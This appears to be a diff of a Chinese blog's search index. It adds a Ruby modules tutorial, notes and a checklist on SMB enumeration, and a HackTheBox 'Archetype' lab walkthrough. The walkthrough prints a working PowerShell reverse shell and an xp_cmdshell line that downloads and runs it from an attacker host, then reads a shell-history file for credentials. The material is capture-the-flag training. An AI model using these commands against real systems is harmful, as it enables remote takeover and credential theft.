@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>Ruby module 模块</title>
+      <link href="/2021/10/09/ruby-module-%E6%A8%A1%E5%9D%97/"/>
+      <url>/2021/10/09/ruby-module-%E6%A8%A1%E5%9D%97/</url>
+      
+        <content type="html"><![CDATA[<p>Ruby 中的模块提供了一个独立的命名空间，可以放置方法和常量，甚至是变量。</p><h2 id="实例方法和常量的使用"><a href="#实例方法和常量的使用" class="headerlink" title="实例方法和常量的使用"></a>实例方法和常量的使用</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">MyModule</span></span></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">my_method</span></span></span><span class="line">    puts <span class="hljs-string">&#x27;Hello&#x27;</span></span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line">  MY_CONSTANT = <span class="hljs-string">&#x27;constant&#x27;</span></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 通过模块获取常量</span></span><span class="line">puts MyModule::MY_CONSTANT <span class="hljs-comment"># =&gt; &#x27;constant&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span></span></span><span class="line">  <span class="hljs-keyword">include</span> MyModule</span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 通过实例使用方法</span></span><span class="line">Foo.new.my_method <span class="hljs-comment"># =&gt; &quot;Hello&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 通过类获取常量</span></span><span class="line">puts Foo::MY_CONSTANT <span class="hljs-comment"># =&gt; &#x27;constant&#x27;</span></span></code></pre></div></div><h2 id="使用模块的变量和模块方法"><a href="#使用模块的变量和模块方法" class="headerlink" title="使用模块的变量和模块方法"></a>使用模块的变量和模块方法</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">MyModule</span></span></span><span class="line">  <span class="hljs-class"><span class="hljs-keyword">class</span> &lt;&lt; self</span></span><span class="line">    <span class="hljs-keyword">attr_accessor</span> <span class="hljs-symbol">:module_var</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">module_method</span></span></span><span class="line">      puts <span class="hljs-string">&quot;module_method&quot;</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-keyword">self</span>.module_var = <span class="hljs-string">&quot;module_var&quot;</span></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">puts MyModule.module_var  <span class="hljs-comment"># =&gt; &quot;module_var&quot;</span></span><span class="line">MyModule.module_method  <span class="hljs-comment"># =&gt; &quot;module_method&quot;</span></span></code></pre></div></div>]]></content>
+      
+      
+      <categories>
+          
+          <category> 编程 </category>
+          
+          <category> ruby </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ruby </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>python 模拟js</title>
       <link href="/2021/09/24/python-%E6%A8%A1%E6%8B%9Fjs/"/>
       <url>/2021/09/24/python-%E6%A8%A1%E6%8B%9Fjs/</url>
@@ -183,6 +210,75 @@
           
       </categories>
       
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>smb</title>
+      <link href="/2021/07/27/smb/"/>
+      <url>/2021/07/27/smb/</url>
+      
+        <content type="html"><![CDATA[<p>SMB(Server Message Block) 是被设计通过LAN来远程读写文件的协议。是微软的主要通讯协议。</p><p>SMB使用了NetBIOS接口，所以为什么smb通常是139，445两个端口?</p><h2 id="Port-139"><a href="#Port-139" class="headerlink" title="Port 139"></a>Port 139</h2><p>端口139是 NBT over IP。</p><p>NetBIOS(Network Basic Input Output System) 可以使软件、PC等设备通过LAN网络进行通讯。</p><p>在NetBIOS网络上运行的软件通过NetBIOS名称进行互相识别。NetBIOS名称长度为16个字符，与计算机名称分开。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-arduino codeBlockLines"><span class="line"><span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span></code></pre></div></div><h2 id="Port-445"><a href="#Port-445" class="headerlink" title="Port 445"></a>Port 445</h2><p>445端口是 SMB over IP， 现在也称为CIFS(Common Internet File System)。运行在应用层，用于提供访问文件、打印机、串口以及其他基于网络的两端节点通讯。</p><p>在Windows中，SMB直接基于TCP/IP运行，不需要NetBIOS,所以一般只有445。<br>而其他操作系统就会有139端口一起，这说明SMB的运行是基于BetBIOS的TCP/IP的。</p><h3 id="IPC"><a href="#IPC" class="headerlink" title="$IPC"></a>$IPC</h3><p>当使用匿名用户或者空用户的时候，可以访问<code>IPC$</code>。使用<a href="#">Post not found: enum4linux-工具使用</a>从这里可以获取：</p><ol><li>操作系统信息</li><li>域的详细信息</li><li>本地用户和组的列表</li><li>可用SMB共享的详细信息</li><li>生效的系统安全策略</li></ol><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="对网段中的主机搜索SMB服务"><a href="#对网段中的主机搜索SMB服务" class="headerlink" title="对网段中的主机搜索SMB服务"></a>对网段中的主机搜索SMB服务</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nbtscan -r 192.168.0.1/24</span></code></pre></div></div><h3 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">msf&gt; use  auxiliary/scanner/smb/smb_version  </span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/sh</span></span><span class="line"><span class="hljs-comment">#Author: rewardone</span></span><span class="line"><span class="hljs-comment">#Description:</span></span><span class="line"><span class="hljs-comment"># Requires root or enough permissions to use tcpdump</span></span><span class="line"><span class="hljs-comment"># Will listen for the first 7 packets of a null login</span></span><span class="line"><span class="hljs-comment"># and grab the SMB Version</span></span><span class="line"><span class="hljs-comment">#Notes:</span></span><span class="line"><span class="hljs-comment"># Will sometimes not capture or will print multiple</span></span><span class="line"><span class="hljs-comment"># lines. May need to run a second time for success.</span></span><span class="line"><span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: ./smbver.sh RHOST &#123;RPORT&#125;&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span>; <span class="hljs-keyword">else</span> rhost=<span class="hljs-variable">$1</span>; <span class="hljs-keyword">fi</span></span><span class="line"><span class="hljs-keyword">if</span> [ ! -z <span class="hljs-variable">$2</span> ]; <span class="hljs-keyword">then</span> rport=<span class="hljs-variable">$2</span>; <span class="hljs-keyword">else</span> rport=139; <span class="hljs-keyword">fi</span></span><span class="line">tcpdump -s0 -n -i tap0 src <span class="hljs-variable">$rhost</span> and port <span class="hljs-variable">$rport</span> -A -c 7 2&gt;/dev/null | grep -i <span class="hljs-string">&quot;samba\|s.a.m&quot;</span> | tr -d <span class="hljs-string">&#x27;.&#x27;</span> | grep -oP <span class="hljs-string">&#x27;UnixSamba.*[0-9a-z]&#x27;</span> | tr -d <span class="hljs-string">&#x27;\n&#x27;</span> &amp; <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;<span class="hljs-variable">$rhost</span>: &quot;</span> &amp;</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;exit&quot;</span> | smbclient -L <span class="hljs-variable">$rhost</span> 1&gt;/dev/null 2&gt;/dev/null</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &amp;&amp; sleep .1</span></code></pre></div></div><h3 id="搜索对应版本的exploit"><a href="#搜索对应版本的exploit" class="headerlink" title="搜索对应版本的exploit"></a>搜索对应版本的exploit</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">msf&gt; search <span class="hljs-built_in">type</span>:exploit platform:windows target:2008 smb</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">searchsploit microsoft smb</span></code></pre></div></div>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透 </category>
+          
+          <category> 知识点 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>smb 渗透清单</title>
+      <link href="/2021/07/27/smb-%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/"/>
+      <url>/2021/07/27/smb-%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/</url>
+      
+        <content type="html"><![CDATA[<p><a href="/2021/07/27/smb/" title="smb">smb</a></p><p>命令已集成到<a href="https://github.com/Elinpf/cmder">cmder</a></p><p>smb的信息收集</p><ul><li><input disabled="" type="checkbox"> 搜索网络中的SMB服务</li><li><input disabled="" type="checkbox"> 版本信息</li><li><input disabled="" type="checkbox"> 针对版本的exploit信息</li></ul><p>没有用户名和密码的情况下</p><ul><li><input disabled="" type="checkbox"> 使用空账号和密码</li><li><input disabled="" type="checkbox"> 使用匿名账号</li><li><input disabled="" type="checkbox"> 使用常用密码快速进行暴力破解</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透 </category>
+          
+          <category> checklist </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HTB start point 1 - Archetype</title>
+      <link href="/2021/07/27/HTB-start-point-1-archetype/"/>
+      <url>/2021/07/27/HTB-start-point-1-archetype/</url>
+      
+        <content type="html"><![CDATA[<ul><li><a href="https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea">参考</a>解读官方文档</li><li><a href="http://imin.red/2020-04-15-0x01-startingpoint-archetype/">这篇文章</a>详细讲述了思考过程</li><li><a href="https://www.hackingarticles.in/smb-penetration-testing-port-445/">这篇文章</a>介绍了关于smb的渗透技巧，包括使用msf</li><li><a href="https://www.hackingarticles.in/mssql-penetration-testing-metasploit/">MSSQL Penetration Testing with Metasploit</a></li><li><a href="https://www.hackingarticles.in/smb-penetration-testing-port-445/">SMB Penetration Testing (Port 445)</a></li></ul><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>侦察阶段，根据<a href="/2021/07/26/Linux-%E4%BE%A6%E5%AF%9F%E6%B8%85%E5%8D%95/" title="Linux 侦察清单">Linux 侦察清单</a>，收集开启的端口</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d <span class="hljs-string">&#x27;/&#x27;</span> -f 1 | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span> | sed s/,$//)</span><span class="line"></br></span><span class="line">nmap -sC -sV -p<span class="hljs-variable">$ports</span> 10.10.10.27 </span></code></pre></div></div><p>通过扫描可以发现<code>445</code>端口是开启的，服务是SQL Server。</p><p>根据<a href="/2021/07/27/smb-%E6%B8%97%E9%80%8F%E6%B8%85%E5%8D%95/" title="smb 渗透清单">smb 渗透清单</a></p><p>可能的漏洞为匿名用户登录</p><p>使用 <code>smbclient -L 10.10.10.27</code>发现</p><p><img src="/2021/07/27/HTB-start-point-1-archetype/1611823952726.png"></p><p>其中有backups可能是突破点，使用 <code>smbclient //10.10.10.27/backups</code>进入smb共享文件，然后发现在目录下有<code>.dtsConfig</code>的文件。</p><blockquote><p>A DTSCONFIG file is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of metadata such as the server name, database names, and other connection properties to configure SSIS packages.</p></blockquote><p>也就是SQLServer的配置文件。</p><p>使用<code>get &lt;filename&gt;</code>命令将文件拷贝到本地后打开发现，<br><img src="/2021/07/27/HTB-start-point-1-archetype/1611824416119.png"></p><p>这个也就是数据库的用户。但是要考虑的是，这个用户可能是没有高级权限的。</p><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>要登录数据库，使用的是<a href="https://github.com/SecureAuthCorp/impacket/tree/master/impacket">impackets</a>工具箱中的<code>mssqlclient.py</code> 工具。</p><p><code>mssqlclint.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code></p><ul><li>注意是<code>/</code></li><li>windows的验证 <code>-windows-auth</code></li></ul><p>当进入mssql之后，要确定权限。</p><ul><li><code>select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code></li></ul><p>确定权限后打开<code>xp_cmdshell</code>运行权限。 在mssqlclient.py中可以直接使用<code>enable_xp_cmdshell</code>一键开启</p><p>然后通过方向连接获得shell。</p><p>手册给出的手动解法是写一个getshell的文件，然后让目标机下载并执行。</p><p>所以这里就有4个点：</p><ol><li>要让目标机下载攻击机中的文件，需要在攻击机上开启下载端口，这里给出的方法是使用http的方式下载。<ul><li><code>python -m http.server 1633</code></li></ul></li><li>目标机下载执行后需要与攻击机建立shell连接，所以需要另外一个监听端口。<ul><li><code>nc -nvlp 5711</code></li></ul></li><li>攻击机上<code>shell.ps1</code>这个文件怎么写</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php codeBlockLines"><span class="line"><span class="hljs-variable">$client</span> = <span class="hljs-keyword">New</span>-<span class="hljs-keyword">Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.14.32&quot;</span>,<span class="hljs-number">5711</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>.<span class="hljs-number">.65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) -ne <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-keyword">New</span>-<span class="hljs-keyword">Object</span> -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | Out-<span class="hljs-keyword">String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;# &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close() </span></code></pre></div></div><ol start="4"><li>目标机上如何下载并运行<code>shell.ps1</code>文件</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">xp_cmdshell &quot;powershell &quot;IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(\&quot;http://10.10.14.32:1633/shell.ps1\&quot;);&quot;&quot;</span></code></pre></div></div><p>这样就可以获得shell了。 那么还有没有其他的方法呢？ 后面讨论</p><h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><p>在本案例中，权限提升是通过找到目标机上的历史记录得到Administrator用户的。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-powershell codeBlockLines"><span class="line"><span class="hljs-built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span></code></pre></div></div><p><img src="/2021/07/27/HTB-start-point-1-archetype/1611890465860.png"></p><p><code>net use</code> 是将远端smb映射到本地上，并且通常会使用用户。</p><p>得到用户密码之后就是登录的操作了。</p><p>使用的工具是<code>psexec</code></p><p><code>psexec administrator@10.10.10.27</code></p><p>flag 就在桌面目录上</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>get shell 的工具：</p><ol><li>MSF <code>exploit/windows/smb/psexec</code><ul><li>使用<a href="https://github.com/trustedsec/unicorn">unicorn</a>可以生成生成对应的shellcode</li></ul></li><li>psexec</li><li>Winexe</li><li>smbexec.py</li><li>wmiexec.py</li><li>CrackMapExec</li><li></li></ol><ul><li><a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">参考文章</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透 </category>
+          
+          <category> HTB </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> windows </tag>
+            
+        </tags>
       
     </entry>
     
